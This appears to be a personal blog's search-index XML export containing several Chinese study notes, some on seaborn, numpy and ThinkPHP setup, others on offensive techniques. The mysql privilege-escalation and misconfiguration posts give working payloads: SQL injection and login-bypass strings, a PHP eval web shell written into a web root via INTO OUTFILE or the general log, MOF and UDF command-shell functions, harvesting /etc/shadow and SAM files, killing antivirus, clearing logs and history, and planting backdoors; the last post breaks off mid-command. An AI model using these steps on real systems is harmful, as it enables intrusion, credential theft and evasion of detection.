<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2019/10/19/order-by-zhu-ru/"/>
      <url>/2019/10/19/order-by-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h1><hr><p>order by 在不知道列名的情况下，可以通过列的序号来代替相应的列。但是经过测试这里无法做运算，如order by 3-1和order by 2是不一样的。</p><p>当desc参数可控的时候，使用if(exp,desc,asc)带入order by 会失效。</p><p>updatexml() 放入order by 后面进行注入</p><p>order by if(0,name,year)可用</p><p>Order by if(0,name,sleep(2))</p><p>order by 可以根据多列进行排序，因此注入的语句不一定限制在order by 的第一个参数，可以通过逗号对新的列进行注入。</p><hr><p>insert into users(id,username,password )values(1,’admin’or updatexml(0,concat(0x7e,database()),1) ,’pass’);</p><hr><h1 id="desc的注入"><a href="#desc的注入" class="headerlink" title="desc的注入"></a>desc的注入</h1><hr><p>desc tablename column_name</p><p>反引号  —》保留字  反引号中间为空代表空格</p><p>万能密码： </p><p> admin’#</p><p>‘+’  ‘+’</p><p>0</p><p>add’=’</p><p>NULL \N （略去空格）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2019/09/28/thinkphp-kuang-jia-dai-ma-shen-ji/"/>
      <url>/2019/09/28/thinkphp-kuang-jia-dai-ma-shen-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP框架代码审计"><a href="#ThinkPHP框架代码审计" class="headerlink" title="ThinkPHP框架代码审计"></a>ThinkPHP框架代码审计</h1><hr><h2 id="1-thinkphp"><a href="#1-thinkphp" class="headerlink" title="1. thinkphp"></a>1. thinkphp</h2><p>ThinkPHP是一个快速、简单的基于MVC和面向对象的轻量级PHP开发框架，遵循Apache2开源协议发布，从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，尤其注重开发体验和易用性，并且拥有众多的原创功能和特性，为WEB应用开发提供了强有力的支持。</p><h2 id="2-thinkphp的核心文件"><a href="#2-thinkphp的核心文件" class="headerlink" title="2. thinkphp的核心文件"></a>2. thinkphp的核心文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www  WEB部署目录（或者子目录）</span><br><span class="line">├─index.php       入口文件</span><br><span class="line">├─README.md       README文件</span><br><span class="line">├─Application     应用目录</span><br><span class="line">├─Public          资源文件目录</span><br><span class="line">└─ThinkPHP        框架目录</span><br></pre></td></tr></table></figure><p>其中thinkphp框架目录结构如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">├─ThinkPHP 框架系统目录（可以部署在非web目录下面）</span><br><span class="line">│  ├─Common       核心公共函数目录</span><br><span class="line">│  ├─Conf         核心配置目录 </span><br><span class="line">│  ├─Lang         核心语言包目录</span><br><span class="line">│  ├─Library      框架类库目录</span><br><span class="line">│  │  ├─Think     核心Think类库包目录</span><br><span class="line">│  │  ├─Behavior  行为类库目录</span><br><span class="line">│  │  ├─Org       Org类库包目录</span><br><span class="line">│  │  ├─Vendor    第三方类库目录</span><br><span class="line">│  │  ├─ ...      更多类库目录</span><br><span class="line">│  ├─Mode         框架应用模式目录</span><br><span class="line">│  ├─Tpl          系统模板目录</span><br><span class="line">│  ├─LICENSE.txt  框架授权协议文件</span><br><span class="line">│  ├─logo.png     框架LOGO文件</span><br><span class="line">│  ├─README.txt   框架README文件</span><br><span class="line">│  └─ThinkPHP.php 框架入口文件</span><br></pre></td></tr></table></figure><p>其中的conf文件和Library文件夹很重要</p><p>项目目录如下：</p><p><img src="/.com//Users\16772\AppData\Roaming\Typora\typora-user-images\1569668921087.png" alt="1569668921087"></p><p>Common下面的conf文件很重要，对项目进行配置，Home模块相当于一个前台的模块，</p><p><img src="/.com//Users\16772\AppData\Roaming\Typora\typora-user-images\1569668993876.png" alt="1569668993876"></p><p>里面含有一些MVC的目录以及模块自己的配置文件</p><h3 id="Model-class-php"><a href="#Model-class-php" class="headerlink" title="Model.class.php"></a>Model.class.php</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ThinkPHP Model模型类定义一系列的连贯操作，实现了ORM和ActiveRecords模式，也就是操作数据库的方法的封装</span><br></pre></td></tr></table></figure><h3 id="Driver-class-php"><a href="#Driver-class-php" class="headerlink" title="Driver.class.php"></a>Driver.class.php</h3><p>thinkphp\ThinkPHP\Library\Think\Db\Driver.class.php这个文件定义了一系列的对数据的分解，parse_limit 就是对limit语句的处理</p><h2 id="3-搭建thinkphp环境"><a href="#3-搭建thinkphp环境" class="headerlink" title="3. 搭建thinkphp环境"></a>3. 搭建thinkphp环境</h2><hr><p>在Home下面的common文件夹下的config.php中配置数据库信息，</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">return</span> <span class="keyword">array</span>(   <span class="comment">//'配置项'=&gt;'配置值'    /* 数据库设置 */    'DB_TYPE'               =&gt;  'mysql',     // 数据库类型    'DB_HOST'               =&gt;  '127.0.0.1', // 服务器地址    'DB_NAME'               =&gt;  'thinkphp',          // 数据库名    'DB_USER'               =&gt;  'root',      // 用户名    'DB_PWD'                =&gt;  'toor',          // 密码    'DB_PORT'               =&gt;  '3306',        // 端口    'DB_PREFIX'             =&gt;  'thinkphp_',    // 数据库表前缀    'DB_PARAMS'            =&gt;  array(), // 数据库连接参数    'DB_DEBUG'           =&gt;  TRUE, // 数据库调试模式 开启后可以记录SQL日志    'DB_FIELDS_CACHE'       =&gt;  true,        // 启用字段缓存    'DB_CHARSET'            =&gt;  'utf8',      // 数据库编码默认采用utf8    'DB_DEPLOY_TYPE'        =&gt;  0, // 数据库部署方式:0 集中式(单一服务器),1 分布式(主从服务器)    'DB_RW_SEPARATE'        =&gt;  false,       // 数据库读写是否分离 主从式有效    'DB_MASTER_NUM'         =&gt;  1, // 读写分离后 主服务器数量    'DB_SLAVE_NO'           =&gt;  '', // 指定从服务器序号    'SHOW_PAGE_TRACE' =&gt;true,);</span></span><br></pre></td></tr></table></figure><p>其中<code>&#39;SHOW_PAGE_TRACE&#39; =&gt;true</code>是开启配置模式。然后在数据库中新建库为thinkphp然后进行新建表明为thinkphp_user,里面添加三个字段 username,id ,password，然后在home下面的控制器里面新建方法：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>namespace Home\Controller;<span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;<span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;        <span class="keyword">$this</span>-&gt;show(<span class="string">'&lt;style type="text/css"&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; body&#123; background: #fff; font-family: "微软雅黑"; color: #333;font-size:24px&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.8em; font-size: 36px &#125; a,a:hover&#123;color:blue;&#125;&lt;/style&gt;&lt;div style="padding: 24px 48px;"&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V&#123;$Think.version&#125;&lt;/div&gt;&lt;script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"&gt;&lt;/script&gt;&lt;thinkad id="ad_55e75dfae343f5a1"&gt;&lt;/thinkad&gt;&lt;script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"&gt;&lt;/script&gt;'</span>,<span class="string">'utf-8'</span>);    &#125;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;        $data=M(<span class="string">"user"</span>)-&gt;where(<span class="string">"id=1"</span>)-&gt;select();        var_dump($data);    &#125;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span><span class="params">()</span></span>&#123;        <span class="keyword">echo</span> <span class="string">"welcome you"</span>;    &#125;&#125;</span><br></pre></td></tr></table></figure><p>访问路径：</p><p><a href="http://127.0.0.1/thinkphp/index.php/home/index/test就可以看到输出数据库的内容。" target="_blank" rel="noopener">http://127.0.0.1/thinkphp/index.php/home/index/test就可以看到输出数据库的内容。</a></p><h2 id="4-控制器"><a href="#4-控制器" class="headerlink" title="4.控制器"></a>4.控制器</h2><hr><h3 id="4-1-A方法"><a href="#4-1-A方法" class="headerlink" title="4.1 A方法"></a>4.1 A方法</h3><hr><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUserindex</span><span class="params">()</span></span>&#123;    $User = A(<span class="string">'User'</span>);    $User-&gt;index();&#125;</span><br></pre></td></tr></table></figure><p>调用UserController里面的index方法</p><hr><h3 id="4-2-R方法"><a href="#4-2-R方法" class="headerlink" title="4.2 R方法"></a>4.2 R方法</h3><hr><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R(&quot;user/index&quot;);</span><br></pre></td></tr></table></figure><p>直接访问User控制器的index方法</p><h3 id="Action参数绑定"><a href="#Action参数绑定" class="headerlink" title="Action参数绑定"></a>Action参数绑定</h3><hr><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function  getUser($id)&#123;    echo &quot;$id&quot;;&#125;</span><br></pre></td></tr></table></figure><p>控制器新建上面的函数：</p><p>默认就会将id参数传递，访问<a href="http://127.0.0.1/thinkphp/index.php/home/index/getuser/id/2，就会输出2" target="_blank" rel="noopener">http://127.0.0.1/thinkphp/index.php/home/index/getuser/id/2，就会输出2</a>.</p><p>通过I方法获得参数：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">getUser</span><span class="params">()</span></span>&#123;    $id = I(<span class="string">"id"</span>, <span class="string">'1'</span>, <span class="string">'intval'</span>);    <span class="keyword">echo</span> $id;&#125;</span><br></pre></td></tr></table></figure><h3 id="插件控制器"><a href="#插件控制器" class="headerlink" title="插件控制器"></a>插件控制器</h3><h2 id="5-thinkphp的sql注入审计"><a href="#5-thinkphp的sql注入审计" class="headerlink" title="5.thinkphp的sql注入审计"></a>5.thinkphp的sql注入审计</h2><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python可视化seaborn库</title>
      <link href="/2019/08/06/python-ke-shi-hua-seaborn-ku/"/>
      <url>/2019/08/06/python-ke-shi-hua-seaborn-ku/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-seaborn初识"><a href="#0x01-seaborn初识" class="headerlink" title="0x01 seaborn初识"></a>0x01 seaborn初识</h1><p>默认的seaborn风格：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns </span><br><span class="line">sns.set()</span><br></pre></td></tr></table></figure><ol><li>whitegrid风格</li><li>dark风格</li><li>white风格</li><li>ticks（刻度线）  sns.despine()去掉上面和右边的轴</li></ol><p><code>sns.set_style(&quot;whitegrid&quot;)</code></p><h1 id="指定子图风格"><a href="#指定子图风格" class="headerlink" title="指定子图风格"></a>指定子图风格</h1><p><code>with sns.axes_style(&quot;darkgrid&quot;)</code>使用其包起来的模块都是这个风格 </p><h1 id="图的子的大小和格子的大小"><a href="#图的子的大小和格子的大小" class="headerlink" title="图的子的大小和格子的大小"></a>图的子的大小和格子的大小</h1><p>sns.set_context(“talk”,font_scale=)</p><h1 id="调色板"><a href="#调色板" class="headerlink" title="调色板"></a>调色板</h1><ul><li>color_palette()能传入任何Matplotlib所支持的颜色</li><li>不写参数默认颜色</li><li>set_palette()设置所有图的颜色</li><li>默认是六个颜色</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">current_palette=sns.color_palette()</span><br><span class="line">sns.palplot(current_palette)</span><br></pre></td></tr></table></figure><h2 id="圆形画板"><a href="#圆形画板" class="headerlink" title="圆形画板"></a>圆形画板</h2><p>六个以上的颜色区分</p><p><code>sns.palplot(sns.color_palette(&quot;hls&quot;,8))</code> </p><p>平均分割成八分，就能区分八种颜色 </p><p><code>sns.palpot(sns.color_palette(&quot;paired&quot;,8))</code> 四队相近的颜色</p><h2 id="使用xkcd颜色命名颜色"><a href="#使用xkcd颜色命名颜色" class="headerlink" title="使用xkcd颜色命名颜色"></a>使用xkcd颜色命名颜色</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">colors=[<span class="string">"windows blue"</span>,<span class="string">"amber"</span>]</span><br><span class="line">sns.palplot(sns.xkcd_palette(colors))</span><br></pre></td></tr></table></figure><h2 id="连续画板"><a href="#连续画板" class="headerlink" title="连续画板"></a>连续画板</h2><p>数据越来越重要则颜色越来越深</p><p><code>sns.palplot(sns.color_palette(&quot;Blues&quot;))</code> 如果想要翻新渐变，可以在画版名称中添加一个_r后缀</p><p>sns.palplot(sns.color_palette(“cubehelix”,8))色调线性变换</p><h2 id="light-palette（）和dark-palette（）调用定制连续调色板"><a href="#light-palette（）和dark-palette（）调用定制连续调色板" class="headerlink" title="light_palette（）和dark_palette（）调用定制连续调色板"></a>light_palette（）和dark_palette（）调用定制连续调色板</h2><p><code>sns.palplot(sns.light_palette(&quot;green&quot;,reverse=True))</code></p><h1 id="单变量分析绘图"><a href="#单变量分析绘图" class="headerlink" title="单变量分析绘图"></a>单变量分析绘图</h1><p><code>sns.distplot(x,bins=20,kde=False，fit=stats.gamma)</code> 分成20等分的直方图（bin）,看它的分布图</p><p>散点图：<code>sns.joinplot(x=&#39;x&#39;,y=&#39;y&#39;,data=df)</code></p><p>当点特别多的时候，使用下面这个函数可以将点变成一个</p><p>sns.joinplot(x-x,y=y,kind=”hex”,color=”k”)</p><h1 id="回归变量分析"><a href="#回归变量分析" class="headerlink" title="回归变量分析"></a>回归变量分析</h1><p><code>sns.pairplot(iris)</code></p><p>regplot()和lmplot()都可以绘制回归关系，推荐regplot() </p><p><code>sns.regplot(x=&quot;totle_bill&quot;,y=&quot;tip&quot;,data=tips)</code></p><h1 id="类别值进行可视化展示"><a href="#类别值进行可视化展示" class="headerlink" title="类别值进行可视化展示"></a>类别值进行可视化展示</h1><p><code>sns.stripplot(x=&quot;day&quot;,y=&quot;totle_bill&quot;,data=tips,jitter=True)</code>点进行一个偏动</p><p> <code>sns.swarmplot(x=&quot;day&quot;,y=&quot;total_bill&quot;，hue=&quot;sex&quot;,data=tips)</code> 树状</p><p>盒图：</p><p>sns.boxplot(x=”day”,y=”total_bill”,hue=”time”,data=tips)</p><p>sns.barplot()</p><h2 id="点图"><a href="#点图" class="headerlink" title="点图"></a>点图</h2><p>sns.pointplot(x=”sex”,y=”survived”,hue=“class”,data=titanic  )</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>numpy使用总结</title>
      <link href="/2019/07/27/numpy-shi-yong-zong-jie/"/>
      <url>/2019/07/27/numpy-shi-yong-zong-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="numpy库使用总结笔记"><a href="#numpy库使用总结笔记" class="headerlink" title="numpy库使用总结笔记"></a>numpy库使用总结笔记</h1><hr><p><strong>anaconda一些基础使用命令</strong>:</p><p><code>conda list</code>:显示已经安装的库</p><p><code>conda install numpy</code>:安装指定的库，类似于pip</p><p><code>anaconda search -t conda tensorflow</code> :显示可以安装的tensorflow的版本</p><p><code>anaconda show lwalkling/tensorflow-gpu</code>:显示如何安装tensorflow</p><hr><h2 id="2-numpy对文件的读取"><a href="#2-numpy对文件的读取" class="headerlink" title="2. numpy对文件的读取;"></a>2. numpy对文件的读取;</h2><p><code>numpy.genfromtxt</code>:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">world_alcohol = numpy.genfromtxt(<span class="string">"world_alcohol.txt"</span>,delimiter=<span class="string">","</span>,dtype = str)</span><br></pre></td></tr></table></figure><h2 id="3-numpy的基础结构"><a href="#3-numpy的基础结构" class="headerlink" title="3. numpy的基础结构"></a>3. numpy的基础结构</h2><h3 id="np-array"><a href="#np-array" class="headerlink" title="np.array"></a>np.array</h3><p>创建的矩阵里面是一个值，这个值是写死的，也就是不可变数组,且数组里面值是同一个类型，如果一个值是字符，那么所有的元素都将转化为一种类型</p><p>创建数组:  <code>np.array([1,2,3,5])</code></p><p>创建矩阵： <code>a=np.array([[1,2,3],[2,3,4]])</code></p><p>查看矩阵的大小: <code>a.shape</code></p><p>查看矩阵里面元素的类型: <code>a.dtype</code></p><p>支持切片的功能array[1:3]</p><p>矩阵的乘法: *相当于执行对应位置相乘</p><p>矩阵的乘法: A.dot(B)</p><p>np.dot(A,B)</p><p>矩阵的运算:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">maxtrix=np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">maxtrix==<span class="number">3</span></span><br></pre></td></tr></table></figure><pre><code>array([[False, False,  True],       [False,  True, False],       [False, False, False]])</code></pre><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用bool类型当索引：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">matrix=np.array([[<span class="number">5</span>,<span class="number">10</span>,<span class="number">15</span>],[<span class="number">20</span>,<span class="number">25</span>,<span class="number">30</span>],[<span class="number">35</span>,<span class="number">40</span>,<span class="number">45</span>]])</span><br><span class="line">second_column_25=(matrix[:,<span class="number">1</span>]==<span class="number">25</span>)</span><br><span class="line">print(second_column_25)</span><br><span class="line">print(matrix[second_column_25,:])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="literal">False</span>  <span class="literal">True</span> <span class="literal">False</span>]</span><br><span class="line">[[<span class="number">20</span> <span class="number">25</span> <span class="number">30</span>]]</span><br></pre></td></tr></table></figure><h2 id="4-numpy矩阵基础"><a href="#4-numpy矩阵基础" class="headerlink" title="4.numpy矩阵基础"></a>4.numpy矩阵基础</h2><h3 id="4-1进行与或非运算："><a href="#4-1进行与或非运算：" class="headerlink" title="4.1进行与或非运算："></a>4.1进行与或非运算：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vector=np.array([<span class="number">5</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">20</span>])</span><br><span class="line">equal_to_ten_or_five=(vector==<span class="number">10</span>)|(vector==<span class="number">5</span>)</span><br><span class="line">print(equal_to_ten_or_five)</span><br></pre></td></tr></table></figure><h3 id="4-2对矩阵中的值进行一个类型转换："><a href="#4-2对矩阵中的值进行一个类型转换：" class="headerlink" title="4.2对矩阵中的值进行一个类型转换："></a>4.2对矩阵中的值进行一个类型转换：</h3><p>vector.astype(float)</p><h3 id="4-3-矩阵求最小值"><a href="#4-3-矩阵求最小值" class="headerlink" title="4.3 矩阵求最小值"></a>4.3 矩阵求最小值</h3><p>array.min()</p><p>4.4 矩阵求最大值：</p><p>array.max()</p><p>4.5 矩阵求和</p><p>array.sum(axis=1)对行进行求和</p><p>array.sum(axis=0)对列进行求和</p><h2 id="numpy的常用函数"><a href="#numpy的常用函数" class="headerlink" title="numpy的常用函数"></a>numpy的常用函数</h2><p>np.arange(15)生成0-14个数字:</p><p>reshape(3,5)变成3行5列</p><p>a.ndim判断矩阵是几个维度</p><p>a.dtype.name 返回矩阵元素的类型</p><p>np.zeros((3,4))返回一个三行四列的0矩阵</p><p>np.ones((2,3,4),dtype=np.int32)</p><p>np.arrage(10,30,5)  小于30不能等于30</p><p>np.random.random((2,3)) 随机生成2x3的随机矩阵  -1到1之间</p><p><code>np.linspace(0,2*pi,100)</code> 在0到2*pi随机取100个值</p><p>np.sin() sin函数</p><p>** 代表乘方</p><p>矩阵直接可以和数值进行比较返回布尔型的矩阵</p><h2 id="矩阵的常用操作"><a href="#矩阵的常用操作" class="headerlink" title="矩阵的常用操作"></a>矩阵的常用操作</h2><p>np.exp(B)对B进行一个指数的几次幂运算</p><p>np.sqrt(B)对矩阵进行一个开方</p><p>np.floor(A)对a进行向下取整</p><p>a.ravel将矩阵变成一个一维的向量</p><p>a.shape=(3,2)将a变成3*2的形式</p><p>a.T进行一个矩阵的转置</p><p>a.reshape(3,-1) 写成-1将会自动进行计算列数</p><p>np.hstack((a,b)) 矩阵的拼接</p><p>np.vstack((a,b))按照纵的进行拼接</p><p>np.hsplite(a,(3,4))横着进行切分，3进行一个切，4进行一个切。</p><h2 id="矩阵的复制操作"><a href="#矩阵的复制操作" class="headerlink" title="矩阵的复制操作"></a>矩阵的复制操作</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">b=a</span><br></pre></td></tr></table></figure><p>矩阵会进行一个复制，如果改变a那么b也就会改变 </p><p><code>c=a.view()</code> 将会重新在内存划分一个相等的东西，虽然是不同的引用，但是如果改变其中c的值，a仍会改变。</p><p><code>c=a.copy()</code>将会重新进行一个复制，这样就是各自两个空间。</p><p>a.argmax(axis=0)找出每一列中最大的索引</p><p>b=np.tile(a,(4,3))进行四行三列的复制</p><p>np.sort(a,axis=1)按照行排序</p><p>np.argsort(a)排序，但是返回索引</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>windows服务器权限分析</title>
      <link href="/2019/07/20/windows-fu-wu-qi-quan-xian-fen-xi/"/>
      <url>/2019/07/20/windows-fu-wu-qi-quan-xian-fen-xi/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql提权笔记</title>
      <link href="/2019/07/17/mysql-ti-quan-bi-ji/"/>
      <url>/2019/07/17/mysql-ti-quan-bi-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-phpnyadmin一句话提权"><a href="#0x01-phpnyadmin一句话提权" class="headerlink" title="0x01 phpnyadmin一句话提权"></a>0x01 phpnyadmin一句话提权</h2><p>利用条件:</p><ul><li><p>查询：SHOW VARIABLES LIKE “secure_file_priv”，为null</p></li><li><p><code>select&#39;&lt;?php @eval($_POST[td]);?&gt;&#39;INTO OUTFILE &#39;C:\\phpStudy\\PHPTutorial\\WWW\\door.php&#39;</code> </p></li></ul><p>使用日志文件:</p><p><code>set global general_log = &quot;ON&quot;;</code></p><p><code>SET global general_log_file=&#39;C:/phpStudy/PHPTutorial/WWW/door.php&#39;;</code></p><p><code>select &#39;&lt;?php eval($_POST[td]);?&gt;&#39;;</code></p><hr><h2 id="0x02-mof提权"><a href="#0x02-mof提权" class="headerlink" title="0x02 mof提权"></a>0x02 mof提权</h2><p>利用条件</p><ul><li><p>windows&lt;=2003</p></li><li><p>可写入c:/windows/system32/mof目录  ，此文件会自动执行</p></li></ul><p><code>select load_file(&#39;C:/wmpub/nullevt.mof&#39;) into dumpfile</code><br><code>&#39;c:/windows/system32/wbem/mof/nullevt.mof’</code></p><hr><h2 id="0x03-udf提权操作"><a href="#0x03-udf提权操作" class="headerlink" title="0x03 udf提权操作"></a>0x03 udf提权操作</h2><p><strong>利用条件</strong></p><ul><li>账号具有对Mysql的insert和delete权限</li></ul><p><strong>利用过程</strong></p><ol><li><p>获取相应权限后上传udf.php</p></li><li><p>访问udf.php进行连接（需要能够远程连接）</p></li><li><p>D:\xampp\mysql\lib\plugin\udf.dll<br>链接成功后导出DLL文件（注意目录）<br>mysql&lt;5.0，导出路径随意；<br>5.0&lt;=mysql&lt;5.1，则需要导出至目标服务器的系统目录（如：system32）<br>mysql&gt;5.1，需要导出到mysql的插件目录<br>查看插件目录：show variables like ‘%plugin%’; </p></li><li><p>创建自定义函数：Create Function cmdshell returns string soname ‘udf.dll’</p><p>已经存在：drop function cmdshell;</p></li><li><p>执行函数：select cmdshell(‘ipconfig’)</p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>利用配置不当提权</title>
      <link href="/2019/07/17/li-yong-pei-zhi-bu-dang-ti-quan/"/>
      <url>/2019/07/17/li-yong-pei-zhi-bu-dang-ti-quan/</url>
      
        <content type="html"><![CDATA[<h1 id="利用配置不当提权-后渗透测试"><a href="#利用配置不当提权-后渗透测试" class="headerlink" title="利用配置不当提权,后渗透测试"></a>利用配置不当提权,后渗透测试</h1><h2 id="0x01-利用条件"><a href="#0x01-利用条件" class="headerlink" title="0x01  利用条件"></a>0x01  利用条件</h2><ul><li><p>权限分配不当，编写的软件直接是用system权限运行的，一些服务是以system运行的，如果可以替换文件为恶意的代码，然后服务启动的时候就会反弹回一个root的shell</p></li><li><p>找到一些默认system执行的服务，尝试替换启动服务的执行程序。</p></li><li>NTFS权限允许users修改删除</li></ul><h2 id="0x02-命令行下快速发现不当配置"><a href="#0x02-命令行下快速发现不当配置" class="headerlink" title="0x02 命令行下快速发现不当配置"></a>0x02 命令行下快速发现不当配置</h2><h3 id="1-icals-windows"><a href="#1-icals-windows" class="headerlink" title="1.  icals:(windows)"></a>1.  icals:(windows)</h3><p><code>icacls C:\windows\*.exe /save perm /T</code>   save成perm文件名，且循环遍历windows目录</p><p>BU是普通users组，PU是powersuser组权限，查找文件下的FA::BU</p><p><code>i586-mingw32msvc-gcc -o admin.exe admin.c</code>  编译成exe程序。 </p><p>2.Find:(linux)</p><p><code>find / -perm 777 -exec ls -l {} \;</code></p><p> -perm指定权限</p><h2 id="0x03-利用配置不当提权"><a href="#0x03-利用配置不当提权" class="headerlink" title="0x03 利用配置不当提权"></a>0x03 利用配置不当提权</h2><h3 id="应用系统的配置文件"><a href="#应用系统的配置文件" class="headerlink" title="应用系统的配置文件"></a><strong>应用系统的配置文件</strong></h3><ul><li>应用连接数据库的配置文件</li><li>后台服务运行账号</li></ul><h2 id="0x04-信息收集"><a href="#0x04-信息收集" class="headerlink" title="0x04 信息收集"></a>0x04 信息收集</h2><h3 id="1-linux基本的信息收集"><a href="#1-linux基本的信息收集" class="headerlink" title="1.linux基本的信息收集"></a>1.linux基本的信息收集</h3><p> <img src="/.com//1563365430694.png" alt="1563365430694"></p><p>第一个是dns配置文件，做dns的劫持</p><p>shadow是用户名的密码，离线破解密码</p><h3 id="2-windows下的信息收集"><a href="#2-windows下的信息收集" class="headerlink" title="2.windows下的信息收集"></a>2.windows下的信息收集</h3><p><img src="/.com//1563365691394.png" alt="1563365691394"></p><p>  net share 开启一个共享，把c盘共享无限制。</p><p>域管理员将其激活。</p><p><img src="/.com//1563366041513.png" alt="1563366041513"></p><p>WMIC执行普通命令行无法执行的命令。</p><p>第一个读取mac和ip</p><p><img src="/.com//1563366249277.png" alt="1563366249277"></p><p>查看当前系统的进程。</p><p><img src="/.com//1563366345007.png" alt="1563366345007"></p><p>结束calc.exe的进程</p><p><img src="/.com//1563366442364.png" alt="1563366442364"></p><p>得到系统安装的软件的版本以及名字</p><p><img src="/.com//1563366507692.png" alt="1563366507692"></p><p>删除杀毒软件在后台偷偷删掉：</p><p><img src="/.com//1563366526660.png" alt="1563366526660"></p><p>查看共享文件夹</p><p><img src="/.com//1563366556772.png" alt="1563366556772"></p><p>开启远程3389桌面</p><p><img src="/.com//1563366583781.png" alt="1563366583781"></p><p>machinename修改为localhost</p><p>查看日志：</p><p><img src="/.com//1563366679612.png" alt="1563366679612"></p><h3 id="3-linux收集敏感信息"><a href="#3-linux收集敏感信息" class="headerlink" title="3.linux收集敏感信息"></a>3.linux收集敏感信息</h3><p> linux下:</p><ul><li><p>/etc: 大量的配置文件  </p></li><li><p>/etc/local/etc</p></li><li><p>/etc/passwd</p></li><li><p>/etc/shadow</p></li><li><p>.ssh；.gnupg  一般都是隐藏的使用ls -la显示出.   .ssh存在已经登录过的ssh密钥</p></li><li><p>业务数据库</p></li><li><p>e-mail 身份认证服务器数据库</p></li><li><p>/tmp 临时目录存放临时数据</p></li></ul><h3 id="4-windows敏感信息收集"><a href="#4-windows敏感信息收集" class="headerlink" title="4.windows敏感信息收集"></a>4.windows敏感信息收集</h3><ul><li>Sam数据库；注册表文件 </li><li>%SYSTEMROOT%\repair\SAM sam修复时候保存的副本</li><li>%SYSTEMROOT%\System32\config\RegBack\Sam</li><li>业务数据库</li><li>临时文件目录</li><li>userProfile\APPData\Local\Microsoft\windows\Temporart internet Files\</li></ul><h2 id="0x05-隐藏痕迹"><a href="#0x05-隐藏痕迹" class="headerlink" title="0x05 隐藏痕迹"></a>0x05 隐藏痕迹</h2><ul><li>禁止在登录界面显示新建账号</li></ul><p><img src="/.com//1563367503819.png" alt="1563367503819"></p><ul><li><p>删除日志文件</p><p><img src="/.com//1563367630425.png" alt="1563367630425"></p></li><li><p>History  history -c清除</p></li><li><p>lsattr 查看文件的权限</p></li><li><p>chattr +i .bash_history  历史命令不会添加在bash历史文件中 先删除再创建在加i</p></li><li><p>日志</p><p>auth.log/secure 登录日志</p><p>btmp/wtmp 数据文件 last查看历史登录信息 lastb </p><p>lastlog faillog  /var/log</p></li></ul><ul><li>其他日志和HIDS等</li></ul><h2 id="0x06-放置隐藏后门"><a href="#0x06-放置隐藏后门" class="headerlink" title="0x06 放置隐藏后门"></a>0x06 放置隐藏后门</h2><h4 id="1-添加到自启项"><a href="#1-添加到自启项" class="headerlink" title="1.添加到自启项"></a>1.添加到自启项</h4><p><code>reg add 